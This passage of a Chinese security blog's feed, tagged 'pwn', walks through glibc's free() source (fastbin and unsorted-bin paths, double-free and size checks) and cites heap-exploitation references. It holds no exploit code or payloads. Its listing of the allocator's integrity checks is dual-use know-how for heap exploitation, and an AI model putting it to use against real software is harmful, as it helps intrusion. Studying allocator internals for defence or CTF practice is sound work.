href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h1><p><a href="http://tukan.farm/2017/07/08/tcache/" target="_blank" rel="noopener">http://tukan.farm/2017/07/08/tcache/</a></p><p><a href="https://www.anquanke.com/post/id/104760" target="_blank" rel="noopener">https://www.anquanke.com/post/id/104760</a></p><p><a href="https://www.cnblogs.com/hac425/p/9416796.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9416796.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;code&gt;glibc 2.26&lt;/code&gt; 开始引入了 &lt;code&gt;tcache&lt;/code&gt; , 相关的 commit 可以看&lt;br&gt;
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>free源码简单分析</title>
    <link href="https://nocbtm.github.io/2020/02/26/free%E6%BA%90%E7%A0%81%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/02/26/free源码简单分析/</id>
    <published>2020-02-26T11:14:51.000Z</published>
    <updated>2020-04-07T03:39:47.606Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GI-libc-free"><a href="#GI-libc-free" class="headerlink" title="_GI___libc_free"></a>_GI___libc_free</h2><p>首先是 _GI___libc_free</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall _GI___libc_free(<span class="keyword">void</span> *ptr)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( _free_hook )</span><br><span class="line">  &#123;</span><br><span class="line">    _free_hook(ptr, retaddr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (<span class="keyword">unsigned</span> __int64)ptr - <span class="number">16</span>;</span><br><span class="line">    v2 = *((_QWORD *)ptr - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v2 &amp; <span class="number">2</span> )                               <span class="comment">// 判断size位，判断是不是 mmap 获得的 chunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !mp_.no_dyn_threshold</span><br><span class="line">        &amp;&amp; v2 &gt; mp_.mmap_threshold</span><br><span class="line">        &amp;&amp; v2 &lt;= <span class="number">0x2000000</span></span><br><span class="line">        &amp;&amp; (v1 &lt; (<span class="keyword">unsigned</span> __int64)dumped_main_arena_start || v1 &gt;= (<span class="keyword">unsigned</span> __int64)dumped_main_arena_end) )</span><br><span class="line">      &#123;</span><br><span class="line">        mp_.mmap_threshold = v2 &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL;</span><br><span class="line">        mp_.trim_threshold = <span class="number">2</span> * (v2 &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL);</span><br><span class="line">      &#125;</span><br><span class="line">      munmap_chunk((mchunkptr)((<span class="keyword">char</span> *)ptr - <span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      av = &amp;main_arena;</span><br><span class="line">      <span class="keyword">if</span> ( v2 &amp; <span class="number">4</span> )</span><br><span class="line">        av = *(malloc_state **)(v1 &amp; <span class="number">0xFFFFFFFFFC000000</span>LL);</span><br><span class="line">      int_free(av, (mchunkptr)v1, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果存在 free_hook ， 就会直接调用 free_hook(ptr) 然后返回。否则判断被 free 的 内存是否是 mmap 获取的 ，如果是则使用 munmap_chunk 回收内存，否则进入 _int_free</p><h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><p>首先会做一些简单的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//检查指针是否正常，对齐</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">"free(): invalid pointer"</span>;</span><br><span class="line">    errout:</span><br><span class="line">      <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">        (<span class="keyword">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">      malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 size 是否 &gt;= MINSIZE ，且是否对齐</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">"free(): invalid size"</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 chunk 是否处于 inuse 状态</span></span><br><span class="line">  check_inuse_chunk(av, p);</span><br></pre></td></tr></table></figure><p>检查</p><ul><li>指针是否对齐</li><li>块的大小是否对齐，且大于最小的大小</li><li>块是否在 inuse 状态</li></ul><h2 id="进入-fastbin"><a href="#进入-fastbin" class="headerlink" title="进入 fastbin"></a>进入 fastbin</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())) &#123;</span><br><span class="line">    <span class="keyword">if</span> (have_lock</span><br><span class="line">        || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">          mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">          locked = <span class="number">1</span>;</span><br><span class="line">          chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ <span class="comment">// next-&gt;size &lt;= 2 * SIZE_SZ</span></span><br><span class="line">            || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem; <span class="comment">// </span></span><br><span class="line">          &#125;))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"free(): invalid next size (fast)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">      old_idx = fastbin_index(chunksize(old));</span><br><span class="line">    p-&gt;fd = old2 = old; <span class="comment">// 插入 fastbin</span></span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">    errstr = <span class="string">"invalid fastbin entry (free)"</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果 size 满足 fastbin 的条件，则首先判断 next_chunk-&gt;size 要满足</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">next_chunk-&gt;size &gt; <span class="number">2</span> * SIZE_SZ</span><br><span class="line">next_chunk-&gt;size &lt; av-&gt;system_mem</span><br></pre></td></tr></table></figure><p>接着就会找对相应的 fastbin ，然后插入 该 bin 的第一项。插入前有一个检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>就是 p-&gt;size 索引到的 fastbin 的第一个指针不能和当前的 p 相同，否则会被认为是 double free</p><h2 id="进入-Unsorted-bin"><a href="#进入-Unsorted-bin" class="headerlink" title="进入 Unsorted bin"></a>进入 Unsorted bin</h2><p>如果被 free 的这个块不是 通过 mmap 获得的，就会进入下面的逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      (<span class="keyword">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">      locked = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 得到下一个 chunk 的指针</span></span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不能 free top chunk</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (top)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="comment">// nextchunk 不能越界，就是限制了 p-&gt;size</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">              &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">              &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">    errstr = <span class="string">"double free or corruption (out)"</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">/*p 要被标识为 inuse 状态 */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (!prev)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    <span class="comment">// nextsize 在  [ 2 * SIZE_SZ, av-&gt;system_mem] 之间</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"free(): invalid next size (normal)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 如果 p的前一个块是 free 状态，就向前合并，通过 p-&gt;pre_inused 判断*/</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      <span class="comment">// 获得 nextchunk 的下一个 chunk, 的 pre_inused位</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果 nextchunk 也是 free 状态的，合并</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">      <span class="comment">// 合并的结果放置到 unsorted bin</span></span><br><span class="line">      bck = unsorted_chunks(av);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 防止 unsortedbin 被破坏</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">"free(): corrupted unsorted chunks"</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">    &#123;</span><br><span class="line">      p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      set_foot(p, size);</span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 free 得到的 unsorted bin 的 size(包括合并chunk 得到的) 大于等于 FASTBIN_CONSOLIDATION_THRESHOLD 就会触发 malloc_consolidate</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">    malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">        (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">      systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">       large, because the corresponding heap might go away.  */</span></span><br><span class="line">    heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">    assert(heap-&gt;ar_ptr == av);</span><br><span class="line">    heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      assert (locked);</span><br><span class="line">      (<span class="keyword">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If the chunk was allocated via mmap, release via munmap().</span></span><br><span class="line"><span class="comment">  */</span></span><br></pre></td></tr></table></figure><p>大概流程</p><ul><li>首先做了一些检查， p != top_chunk, p-&gt;size 不能越界， 限制了 next_chunk-&gt;size, p要处于 inuse状态（通过 next_chunk-&gt;pre_inused 判断）</li><li>接着判断 p 的前后相邻块是不是 free 状态，如果是就合并</li><li>根据此次拿到的 unsorted bin 的 大小，如果 size&gt;=FASTBIN_CONSOLIDATION_THRESHOLD 就会触发 malloc_consolidate</li></ul><p>如果 p 是通过 mmap 获得的，就通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">munmap_chunk (p);</span><br></pre></td></tr></table></figure></p><p>释放掉他</p><h2 id="Check-In-Glbc"><a href="#Check-In-Glbc" class="headerlink" title="Check In Glbc"></a>Check In Glbc</h2><p><img alt="" data-src="/imgs/check_free.png" class="lozad"></p><p>来源 <a href="https://github.com/DhavalKapil/heap-exploitation" target="_blank" rel="noopener">https://github.com/DhavalKapil/heap-exploitation</a></p><p><a href="https://heap-exploitation.dhavalkapil.com/author.html" target="_blank" rel="noopener">https://heap-exploitation.dhavalkapil.com/author.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;GI-libc-free&quot;&gt;&lt;a href=&quot;#GI-libc-free&quot; class=&quot;headerlink&quot; title=&quot;_GI___libc_free&quot;&gt;&lt;/a&gt;_GI___libc_free&lt;/h2&gt;&lt;p&gt;首先是 _GI___libc_free&lt;/p&gt;

      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
</feed>
